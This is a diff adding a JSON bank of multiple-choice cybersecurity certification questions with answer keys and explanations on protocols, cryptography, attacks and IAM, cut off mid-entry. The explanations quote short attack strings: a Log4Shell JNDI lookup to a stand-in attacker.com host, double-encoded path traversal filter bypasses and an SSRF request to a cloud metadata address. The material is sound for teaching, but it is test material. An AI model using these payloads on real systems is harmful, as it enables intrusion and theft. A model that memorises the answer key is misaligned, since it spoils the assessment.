@@ -1,0 +1,1202 @@
+[
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An administrator is configuring an IPsec VPN tunnel between two remote offices. If the administrator wants to ensure that the original IP headers of packets are completely encrypted and encapsulated inside a new outer IP packet header, which IPsec mode should be selected?",
+    "options": {
+      "A": "Tunnel Mode",
+      "B": "Transport Mode",
+      "C": "AH-only Mode",
+      "D": "ESP Transport Mode"
+    },
+    "correctAnswer": "A",
+    "explanation": "Tunnel Mode encrypts both the payload and the original IP header of the packet, encapsulating it inside a new IP packet with a new header. Transport Mode only encrypts the payload (the transport layer protocols like TCP/UDP) and leaves the original IP header unencrypted, making it less suitable for secure site-to-site gateway connections.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What primary security threat does DNSSEC (Domain Name System Security Extensions) address?",
+    "options": {
+      "A": "Unauthorized DNS zone transfers",
+      "B": "Eavesdropping on DNS query payloads",
+      "C": "DNS spoofing and cache poisoning attacks",
+      "D": "Distributed Denial of Service (DDoS) amplification attacks"
+    },
+    "correctAnswer": "C",
+    "explanation": "DNSSEC prevents DNS cache poisoning and spoofing by digitally signing DNS records. This ensures that the DNS response received by a client is authentic and has not been altered in transit, although it does not encrypt the queries themselves (which is solved by DNS over HTTPS/TLS).",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which Extensible Authentication Protocol (EAP) method is considered the most secure because it requires mutual authentication using digital certificates on both the client and the authentication server?",
+    "options": {
+      "A": "EAP-TLS",
+      "B": "EAP-PEAP",
+      "C": "EAP-FAST",
+      "D": "EAP-MD5"
+    },
+    "correctAnswer": "A",
+    "explanation": "EAP-TLS (Transport Layer Security) uses public key infrastructure (PKI) to perform mutual authentication, requiring both the client device and the server to present valid digital certificates. Other methods like PEAP or EAP-FAST typically only require a server-side certificate and authenticate the client using passwords.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "How does BGPSEC (Border Gateway Protocol Security) mitigate BGP hijacking attacks compared to standard BGP?",
+    "options": {
+      "A": "It encrypts the entire BGP routing table stored on routers.",
+      "B": "It uses cryptographically signed route advertisements via RPKI to verify the path origin.",
+      "C": "It blocks all updates from unknown Autonomous System Numbers (ASNs).",
+      "D": "It runs BGP over an IPsec tunnel by default."
+    },
+    "correctAnswer": "B",
+    "explanation": "BGPSEC uses Resource Public Key Infrastructure (RPKI) to digitally sign BGP path attributes. This allows receiving routers to verify that the Autonomous System (AS) advertising the route is authorized to do so, preventing malicious or accidental route hijacking.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "TLS 1.3 introduced significant changes to improve handshake speed and security. Which of the following key exchange mechanisms was deprecated in TLS 1.3 in favor of ephemeral Diffie-Hellman key exchanges?",
+    "options": {
+      "A": "Static RSA Key Transport",
+      "B": "ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)",
+      "C": "DHE (Diffie-Hellman Ephemeral)",
+      "D": "PSK (Pre-Shared Key) exchange"
+    },
+    "correctAnswer": "A",
+    "explanation": "TLS 1.3 deprecated static RSA key transport to enforce Perfect Forward Secrecy (PFS). In static RSA, if the server's private key is compromised, all past session keys can be decrypted. TLS 1.3 forces ephemeral Diffie-Hellman (DHE/ECDHE) for all key exchanges.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "To prevent VLAN hopping attacks via double-tagging, what configuration change is recommended on network switches?",
+    "options": {
+      "A": "Change the native VLAN of all trunk ports to an unused, non-default VLAN ID.",
+      "B": "Enable Dynamic Trunking Protocol (DTP) on all access ports.",
+      "C": "Disable Spanning Tree Protocol (STP) on all switch-to-switch links.",
+      "D": "Set the default native VLAN to VLAN 1 on all trunk links."
+    },
+    "correctAnswer": "A",
+    "explanation": "VLAN hopping double-tagging exploits default configurations where the native VLAN is VLAN 1. By changing the native VLAN of trunk ports to a dummy/unused VLAN ID and disabling auto-trunking, attackers cannot trick switches into stripping the outer tag and forwarding the frame to the victim VLAN.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which Layer of the OSI model does MACsec (802.1AE) operate at, and what security objective does it achieve?",
+    "options": {
+      "A": "Layer 3 (Network); provides end-to-end VPN tunnels across the Internet",
+      "B": "Layer 2 (Data Link); provides encryption and integrity on point-to-point Ethernet links",
+      "C": "Layer 4 (Transport); secures TCP connections for web traffic",
+      "D": "Layer 7 (Application); provides application-level API gateway authorization"
+    },
+    "correctAnswer": "B",
+    "explanation": "MACsec (IEEE 802.1AE) is a Layer 2 protocol that provides line-rate encryption, integrity, and authenticity for traffic over Ethernet links. Unlike IPsec (Layer 3) or TLS (Layer 4), MACsec secures all traffic, including control plane protocols, on direct physical or logical local area network links.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is a primary operational distinction between DNS over TLS (DoT) and DNS over HTTPS (DoH)?",
+    "options": {
+      "A": "DoT runs on UDP port 53, while DoH runs on TCP port 443.",
+      "B": "DoT uses port 853 and is easily identified and blocked by network firewalls; DoH uses port 443 and blends in with normal HTTPS web traffic.",
+      "C": "DoT is a symmetric protocol, while DoH uses asymmetric cryptography.",
+      "D": "DoT is designed for local area networks, while DoH is only used over wide area networks."
+    },
+    "correctAnswer": "B",
+    "explanation": "DNS over TLS (DoT) operates on a dedicated port (853), making it simple for firewalls to monitor or block. DNS over HTTPS (DoH) uses port 443, sharing it with standard encrypted web traffic, which makes DoH traffic much harder to block or distinguish without deep packet inspection/TLS decryption.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which mechanism in the Stream Control Transmission Protocol (SCTP) makes it more resilient against SYN flood attacks compared to standard TCP?",
+    "options": {
+      "A": "A dynamic 3-way handshake that uses random sequence numbers",
+      "B": "A 4-way handshake using a cryptographically signed cookie to store state on the client side",
+      "C": "Automatic encryption of the handshake packets using TLS",
+      "D": "Limiting connection requests to pre-authenticated IP addresses"
+    },
+    "correctAnswer": "B",
+    "explanation": "SCTP uses a 4-way handshake with an INIT ACK containing a State Cookie. The server does not allocate memory for the connection state until the client responds with a COOKIE ECHO. This prevents resource exhaustion attacks like TCP SYN floods, where an attacker sends many INIT requests without responding.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An organization is transitioning to a Secure Access Service Edge (SASE) architecture. Which of the following best describes SASE's core design principle?",
+    "options": {
+      "A": "Centrally managing on-premises firewalls through a local active-directory domain controller.",
+      "B": "Converging software-defined WAN (SD-WAN) networking with cloud-delivered security services like CASB, ZTNA, and SWG.",
+      "C": "Deploying physical hardware intrusion prevention systems at every corporate branch office.",
+      "D": "Routing all mobile device traffic through a centralized, on-premises corporate datacenter."
+    },
+    "correctAnswer": "B",
+    "explanation": "SASE is a network architecture that combines SD-WAN features with cloud-native security services—including Cloud Access Security Brokers (CASB), Zero Trust Network Access (ZTNA), and Secure Web Gateways (SWG)—into a unified, cloud-delivered service model.",
+    "topic": "Network security protocols and architecture",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following Advanced Encryption Standard (AES) modes of operation is classified as an Authenticated Encryption with Associated Data (AEAD) cipher, providing both confidentiality and integrity in a single step?",
+    "options": {
+      "A": "AES-CBC (Cipher Block Chaining)",
+      "B": "AES-GCM (Galois/Counter Mode)",
+      "C": "AES-ECB (Electronic Codebook)",
+      "D": "AES-CTR (Counter)"
+    },
+    "correctAnswer": "B",
+    "explanation": "AES-GCM is an AEAD (Authenticated Encryption with Associated Data) mode. It provides both confidentiality (via counter-mode encryption) and integrity/authenticity (via a Galois message authentication code) simultaneously, eliminating the need to manually compute separate HMACs.",
+    "topic": "Cryptography",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which cryptographic concept ensures that if an attacker compromises a server's long-term private key today, they still cannot decrypt session keys from traffic they intercepted and recorded in the past?",
+    "options": {
+      "A": "Non-repudiation",
+      "B": "Key Escrow",
+      "C": "Perfect Forward Secrecy (PFS)",
+      "D": "Homomorphic Encryption"
+    },
+    "correctAnswer": "C",
+    "explanation": "Perfect Forward Secrecy (PFS) ensures that a compromise of long-term private keys does not compromise past session keys. It is achieved by generating a unique, temporary (ephemeral) session key for every conversation using protocols like ECDHE (Elliptic Curve Diffie-Hellman Ephemeral).",
+    "topic": "Cryptography",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What mathematical foundation is the security of the Diffie-Hellman key exchange protocol based on?",
+    "options": {
+      "A": "The difficulty of factoring large prime numbers",
+      "B": "The discrete logarithm problem in cyclic groups",
+      "C": "The shortest vector problem in lattice grids",
+      "D": "The difficulty of solving quadratic residues"
+    },
+    "correctAnswer": "B",
+    "explanation": "The Diffie-Hellman key exchange relies on the mathematical complexity of the discrete logarithm problem. While it is easy to calculate g^x mod p, it is computationally infeasible to determine x given g^x, g, and p, assuming p is a sufficiently large prime.",
+    "topic": "Cryptography",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "In RSA cryptography, if a message payload m is encrypted using a public key exponent e to produce ciphertext c = m^e mod n, which formula is used by the private key holder (using private exponent d) to decrypt it?",
+    "options": {
+      "A": "m = c^d mod n",
+      "B": "m = c^(1/e) mod n",
+      "C": "m = c * d mod n",
+      "D": "m = c^e mod d"
+    },
+    "correctAnswer": "A",
+    "explanation": "In RSA, encryption is performed using the public key pair (e, n) with c = m^e mod n. Decryption is performed using the private key pair (d, n) with m = c^d mod n, because mathematical properties guarantee that (m^e)^d = m^(e*d) = m^1 mod n.",
+    "topic": "Cryptography",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Why is a Hash-based Message Authentication Code (HMAC) constructed using nested hash operations (such as H(K XOR opad || H(K XOR ipad || M))) instead of a simple key-message concatenation like H(K || M)?",
+    "options": {
+      "A": "To compress the message to a smaller final signature size.",
+      "B": "To prevent length extension attacks on vulnerable hash functions like MD5 or SHA-1.",
+      "C": "To speed up the hashing execution time on modern CPU hardware.",
+      "D": "To allow the hash to be decrypted back to the plaintext message."
+    },
+    "correctAnswer": "B",
+    "explanation": "Standard Merkle-Damgard hash functions (like SHA-1, SHA-256, and MD5) are vulnerable to length extension attacks. If a MAC were calculated as simple H(K || M), an attacker could compute a valid hash for (M || attacker_data) without knowing the secret key K. The nested structure of HMAC prevents this vulnerability.",
+    "topic": "Cryptography",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary advantage of Elliptic Curve Cryptography (ECC) over RSA?",
+    "options": {
+      "A": "ECC supports larger block sizes for direct file encryption.",
+      "B": "ECC provides equivalent security to RSA with significantly smaller key sizes, reducing compute overhead.",
+      "C": "ECC is natively resistant to quantum computer decryption attacks.",
+      "D": "ECC does not require the exchange of public keys."
+    },
+    "correctAnswer": "B",
+    "explanation": "ECC offers the same cryptographic strength as RSA with much smaller key sizes (e.g., a 256-bit ECC key offers similar security to a 3072-bit RSA key). This results in faster computation, lower memory usage, and reduced bandwidth overhead, making it ideal for mobile devices and smart cards.",
+    "topic": "Cryptography",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following algorithms is specifically designed for password hashing and includes a work factor to intentionally slow down hash calculation to resist GPU/ASIC brute-forcing?",
+    "options": {
+      "A": "MD5",
+      "B": "SHA-256",
+      "C": "Argon2",
+      "D": "HMAC-SHA-512"
+    },
+    "correctAnswer": "C",
+    "explanation": "Argon2 (winner of the Password Hashing Competition), along with bcrypt and PBKDF2, are slow cryptographic hashing functions. They feature a configurable 'work factor' (cost) that increases the memory and CPU/GPU time required to compute each hash, making automated brute-force attacks computationally expensive.",
+    "topic": "Cryptography",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What type of cryptographic vulnerability is exploited in padding oracle attacks (such as POODLE or Lucky Thirteen)?",
+    "options": {
+      "A": "Collisions in the underlying hashing algorithm.",
+      "B": "Weakness in the pseudo-random number generator (PRNG) seed value.",
+      "C": "Leaked information from server error messages or timing differences during block cipher padding validation.",
+      "D": "Inability of symmetric ciphers to handle key lengths greater than 128 bits."
+    },
+    "correctAnswer": "C",
+    "explanation": "Padding oracle attacks exploit implementations where a server decrypts ciphertext and returns different errors or responds with different timing depending on whether the padding of the decrypted block is valid. This feedback allows an attacker to decrypt bytes of ciphertext without knowing the key.",
+    "topic": "Cryptography",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Alice wants to send a digitally signed message to Bob. To construct the digital signature in a way that proves non-repudiation and integrity, Alice should encrypt the hash of the message using:",
+    "options": {
+      "A": "Alice's Private Key",
+      "B": "Alice's Public Key",
+      "C": "Bob's Public Key",
+      "D": "Bob's Private Key"
+    },
+    "correctAnswer": "A",
+    "explanation": "To create a digital signature, Alice encrypts the message hash with her own private key. Bob can then decrypt this signature using Alice's public key. If the decrypted hash matches the calculated hash of the received message, it proves that the message was signed by Alice and has not been modified.",
+    "topic": "Cryptography",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "As organizations prepare for post-quantum cryptography (PQC), which mathematical structure forms the primary basis of the NIST-selected primary algorithms (like ML-KEM/Kyber)?",
+    "options": {
+      "A": "Elliptic Curve Isogenies",
+      "B": "Lattice-based cryptography problems",
+      "C": "Multivariate quadratic equations",
+      "D": "Hash-based digital signatures"
+    },
+    "correctAnswer": "B",
+    "explanation": "Most of the primary post-quantum algorithms selected by NIST, such as ML-KEM (Kyber) for key encapsulation and ML-DSA (Dilithium) for digital signatures, are based on lattice-based cryptography. These problems (like Shortest Vector Problem) are believed to be computationally secure against both classical and quantum computers.",
+    "topic": "Cryptography",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "A security analyst is reviewing web server logs and notices a series of long URLs containing database queries that result in slow response times. The attacker is not receiving any database output on the page, but is extracting data character-by-character based on whether the server takes 5 seconds to respond. What specific attack is occurring?",
+    "options": {
+      "A": "Stored XSS",
+      "B": "Out-of-band SQL Injection",
+      "C": "Time-based Blind SQL Injection",
+      "D": "Cross-Site Request Forgery"
+    },
+    "correctAnswer": "C",
+    "explanation": "Time-based Blind SQL Injection is used when a web application does not return database errors or data directly in HTTP responses. The attacker injects queries that instruct the database to sleep/delay (e.g., pg_sleep(5)) if a condition is true, allowing data extraction based on response latency.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following mitigations is most effective at preventing Cross-Site Request Forgery (CSRF) by ensuring session cookies are not sent with cross-site requests?",
+    "options": {
+      "A": "Setting the cookie's SameSite attribute to 'Strict' or 'Lax'",
+      "B": "Enabling Content Security Policy (CSP) headers",
+      "C": "Sanitizing HTML input tags against script blocks",
+      "D": "Using HTTPS instead of HTTP"
+    },
+    "correctAnswer": "A",
+    "explanation": "The SameSite cookie attribute controls whether cookies are sent with cross-site requests. Setting SameSite=Strict or SameSite=Lax prevents the browser from automatically sending the session identifier cookie when a third-party site initiates a request, mitigating CSRF.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An attacker injects a malicious payload into a client-side JavaScript file that executes in the user's browser, modifying the Document Object Model (DOM) environment directly without any server-side input reflection. Which type of Cross-Site Scripting (XSS) is this?",
+    "options": {
+      "A": "Stored XSS",
+      "B": "Reflected XSS",
+      "C": "DOM-based XSS",
+      "D": "Blind XSS"
+    },
+    "correctAnswer": "C",
+    "explanation": "DOM-based XSS occurs entirely client-side. The vulnerability exists within the page's client-side scripting, where user input (e.g., location.hash) is processed insecurely (e.g., via innerHTML) without ever hitting the web server or being reflected in the initial HTML response.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An attacker exploits a vulnerability in a web application to force the server to issue an HTTP request to http://169.254.169.254/latest/meta-data/ to retrieve temporary cloud credentials. What classification of vulnerability does this represent?",
+    "options": {
+      "A": "Server-Side Request Forgery (SSRF)",
+      "B": "Broken Object Level Authorization (BOLA)",
+      "C": "Local File Inclusion (LFI)",
+      "D": "Cross-Site Scripting (XSS)"
+    },
+    "correctAnswer": "A",
+    "explanation": "Server-Side Request Forgery (SSRF) occurs when an attacker can abuse server functionality to read or update internal resources. In cloud environments, SSRF is commonly used to access the cloud instance metadata service (IMDS) at the non-routable link-local IP 169.254.169.254 to steal API keys or IAM roles.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "How does a Man-in-the-Middle (MitM) attacker execute an Address Resolution Protocol (ARP) spoofing attack on a local area network (LAN)?",
+    "options": {
+      "A": "By flooding the switch with traffic to force it into 'fail-open' hub mode.",
+      "B": "By sending unsolicited ARP replies to associate the attacker's MAC address with the IP address of the default gateway.",
+      "C": "By altering the DNS cache records on the local DNS server.",
+      "D": "By setting up a rogue DHCP server that assigns duplicate IP addresses."
+    },
+    "correctAnswer": "B",
+    "explanation": "ARP spoofing involves sending fake (unsolicited) ARP responses onto a LAN. These packets map the MAC address of the attacker's network card to the IP address of a legitimate target (such as the router/gateway), redirecting the victim's traffic through the attacker's system.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "The Log4Shell vulnerability (CVE-2021-44228) was a critical remote code execution flaw in Apache Log4j. What underlying capability was exploited to allow this remote execution?",
+    "options": {
+      "A": "Buffer overflow in the C-language binding of the logging framework.",
+      "B": "Java Naming and Directory Interface (JNDI) lookups that resolved untrusted remote LDAP resources.",
+      "C": "XML External Entity (XXE) injection via parser configuration defaults.",
+      "D": "Insecure deserialization of native Python pickle data."
+    },
+    "correctAnswer": "B",
+    "explanation": "Log4Shell exploited the JNDI lookup feature in Log4j. If a string containing '${jndi:ldap://attacker.com/a}' was logged, Log4j would query the attacker's LDAP server, download a malicious Java class file, and execute it, leading to full server compromise.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary difference between a session fixation attack and a session hijacking attack?",
+    "options": {
+      "A": "Session hijacking requires administrative privileges; session fixation does not.",
+      "B": "In session fixation, the attacker forces a known session identifier onto the victim; in session hijacking, the attacker steals an existing active session identifier.",
+      "C": "Session fixation only affects desktop browsers; session hijacking targets mobile apps.",
+      "D": "There is no difference; they are synonymous terms."
+    },
+    "correctAnswer": "B",
+    "explanation": "In session fixation, the attacker sets a victim's session identifier to a known value (e.g., sending a link with a query parameter session ID) before the user logs in. Once authenticated, the attacker accesses the account. Session hijacking involves stealing a token that has already been generated by the server.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "To mitigate buffer overflow vulnerabilities on the stack, modern compilers can insert a random integer value immediately before the stack return pointer. If this value has been modified when a function returns, execution is halted. What is this security mechanism called?",
+    "options": {
+      "A": "Stack Canary",
+      "B": "Address Space Layout Randomization (ASLR)",
+      "C": "Data Execution Prevention (DEP)",
+      "D": "SafeSEH"
+    },
+    "correctAnswer": "A",
+    "explanation": "A Stack Canary (or security cookie) is a random value placed on the stack between local variables and the return address. When a function returns, the program checks if the canary value has changed. If a buffer overflow has occurred and overwritten the return pointer, it will also overwrite the canary, alerting the system to stop execution.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An attacker attempts a Directory Traversal attack on a web application but notices that inputs containing '../' are stripped out. Which evasion technique might allow the attacker to bypass this basic blacklist filter?",
+    "options": {
+      "A": "Converting the payload to all uppercase letters.",
+      "B": "Using URL encoding (like '%2e%2e%2f') or double-URL encoding (like '%252e%252e%252f') of path traversal characters.",
+      "C": "Routing the web traffic through a proxy server.",
+      "D": "Changing the HTTP request method from GET to POST."
+    },
+    "correctAnswer": "B",
+    "explanation": "Basic blacklist filters that search for '../' can be bypassed using alternate encodings. URL encoding '%2e%2e%2f' or double-URL encoding '%252e%252e%252f' can trick poorly written filters that decode input only once or expect only raw character inputs.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An advanced persistent threat (APT) group compromises a popular regional restaurant review blog commonly frequented by employees of a nearby target defense contractor. This is an example of what type of attack?",
+    "options": {
+      "A": "Spear Phishing",
+      "B": "Watering Hole Attack",
+      "C": "Smishing",
+      "D": "Whaling"
+    },
+    "correctAnswer": "B",
+    "explanation": "A Watering Hole attack targets a specific group of users by identifying websites they frequently visit (the 'watering hole'), compromising one of those sites, and planting malware on it to infect visitors from the target organization.",
+    "topic": "Threat vectors, vulnerabilities, and common attacks",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An enterprise requires access decisions to be evaluated dynamically at runtime based on variables such as user location, request time, device security posture, and resource classification. Which access control model is best suited for this requirement?",
+    "options": {
+      "A": "Role-Based Access Control (RBAC)",
+      "B": "Attribute-Based Access Control (ABAC)",
+      "C": "Discretionary Access Control (DAC)",
+      "D": "Mandatory Access Control (MAC)"
+    },
+    "correctAnswer": "B",
+    "explanation": "ABAC (Attribute-Based Access Control) evaluates attributes of the subject (e.g., role, department), resource (e.g., sensitivity, owner), and environment (e.g., IP address, current time) against policies to grant access, allowing highly granular and contextual security rules.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary technical relationship between OAuth 2.0 and OpenID Connect (OIDC)?",
+    "options": {
+      "A": "OIDC is a proprietary alternative to the open-source OAuth 2.0 protocol.",
+      "B": "OIDC is a simple identity layer built on top of the OAuth 2.0 authorization framework to provide client authentication and user profile data.",
+      "C": "OAuth 2.0 handles SAML tokens, while OIDC handles XML certificates.",
+      "D": "OAuth 2.0 is used for internal network directories, whereas OIDC is only used for external APIs."
+    },
+    "correctAnswer": "B",
+    "explanation": "OAuth 2.0 is strictly an authorization framework that issues access tokens to third-party applications. OpenID Connect (OIDC) is an extension layer built on top of OAuth 2.0 that standardizes authentication, introducing ID tokens (typically JSON Web Tokens) and a UserInfo endpoint to convey user identity.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following is a primary function of a Privileged Access Management (PAM) solution?",
+    "options": {
+      "A": "Enforcing password complexity for general non-employee email accounts.",
+      "B": "Providing credential vaulting, session recording, and just-in-time privilege elevation for administrative accounts.",
+      "C": "Enforcing firewalls rules at the subnet boundary.",
+      "D": "Decrypting end-to-end user database traffic."
+    },
+    "correctAnswer": "B",
+    "explanation": "PAM solutions focus on protecting administrative (privileged) accounts. They do this by securing credentials in an encrypted vault, recording active administrative sessions for auditing, and granting temporary, just-in-time (JIT) access to reduce administrative attack surface.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "In federated Identity architectures, what is the core operational difference between Identity Provider (IdP) initiated SSO and Service Provider (SP) initiated SSO?",
+    "options": {
+      "A": "IdP-initiated SSO starts at the application's login page, whereas SP-initiated SSO begins from a central user portal.",
+      "B": "SP-initiated SSO begins at the application's login page, redirecting the user to the IdP for authentication before redirecting back with an assertion; IdP-initiated SSO begins directly at the identity provider's portal.",
+      "C": "IdP-initiated SSO requires public certificates; SP-initiated SSO requires symmetric keys.",
+      "D": "There is no functional or architectural difference between them."
+    },
+    "correctAnswer": "B",
+    "explanation": "SP-initiated SSO starts when a user visits the target application (Service Provider), which redirects the client browser to the Identity Provider (IdP) with an auth request. IdP-initiated SSO starts inside the IdP portal (e.g., Okta Dashboard), where clicking an app icon posts a pre-built SAML assertion directly to the SP.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What standard protocol is used to automate user provisioning, modification, and deprovisioning identity lifecycles across different domains and cloud applications?",
+    "options": {
+      "A": "SCIM (System for Cross-domain Identity Management)",
+      "B": "LDAP (Lightweight Directory Access Protocol)",
+      "C": "OAuth 1.0a",
+      "D": "SMTP (Simple Mail Transfer Protocol)"
+    },
+    "correctAnswer": "A",
+    "explanation": "SCIM is an open standard protocol designed to automate user provisioning, updates, and deletion between an Identity Provider (like Azure AD or Okta) and Service Providers (SaaS apps). It uses REST APIs with JSON payloads to synchronize user records.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "How does mutual TLS (mTLS) authentication improve web API security compared to standard one-way TLS?",
+    "options": {
+      "A": "It doubles the encryption keyspace, preventing brute-force attacks.",
+      "B": "It requires the client to verify the server's certificate, but does not identify the client.",
+      "C": "It requires both the client and the server to present and verify each other's digital certificates.",
+      "D": "It requires the client to enter a username and password along with their fingerprint."
+    },
+    "correctAnswer": "C",
+    "explanation": "Standard TLS only requires the server to present a digital certificate to the client (one-way). Mutual TLS (mTLS) requires both the server and client to present certificates, providing cryptographically strong, passwordless identity verification for both parties before establishing the connection.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "In a Mandatory Access Control (MAC) model, who is authorized to modify access permissions to files?",
+    "options": {
+      "A": "The creator or owner of the file.",
+      "B": "The system administrator or security policy manager, based on classification labels.",
+      "C": "Any user with read-only access to the file directory.",
+      "D": "The software application that created the file."
+    },
+    "correctAnswer": "B",
+    "explanation": "Unlike Discretionary Access Control (DAC), where the file owner decides who has access, MAC is non-discretionary. Access decisions are strictly governed by system-wide security policies and labels (e.g., Secret, Confidential) defined by the administrator or security officer.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Why is FIDO2/WebAuthn multi-factor authentication considered highly resistant to phishing compared to SMS OTP or authenticator apps?",
+    "options": {
+      "A": "Because it uses biometrics which cannot be stolen.",
+      "B": "Because the generated cryptographic signatures are bound to the specific domain origin (URL) and private keys never leave the hardware authenticator.",
+      "C": "Because FIDO2 encrypts the network connection using a custom tunnel.",
+      "D": "Because FIDO2 authentication codes expire in 10 seconds rather than 30 seconds."
+    },
+    "correctAnswer": "B",
+    "explanation": "FIDO2/WebAuthn uses asymmetric public-key cryptography. During authentication, the hardware authenticator signs a challenge. Crucially, the browser enforces that the key pair is bound to the specific origin domain (URL). Even if a user is tricked into visiting a phishing site, the authenticator will not sign the challenge for the fake domain, preventing credential theft.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An administrator writes a cloud IAM policy that has an explicit 'Deny' statement for action 's3:GetObject' on all resources, but also has an 'Allow' statement for the same action on a specific bucket. When a user tries to access that bucket, what will be the access outcome?",
+    "options": {
+      "A": "Access is Allowed, because explicit allows override explicit denies.",
+      "B": "Access is Denied, because an explicit deny statement always overrides any allow statements in cloud policy evaluation logic.",
+      "C": "Access is deferred to the resource owner's permissions.",
+      "D": "The policy will fail to compile and access will default to allowed."
+    },
+    "correctAnswer": "B",
+    "explanation": "In cloud IAM policy evaluation (such as AWS IAM), an explicit 'Deny' always overrides any explicit 'Allow' statements, regardless of the order or scope of the policies. If a deny exists, the final evaluation is always denied.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
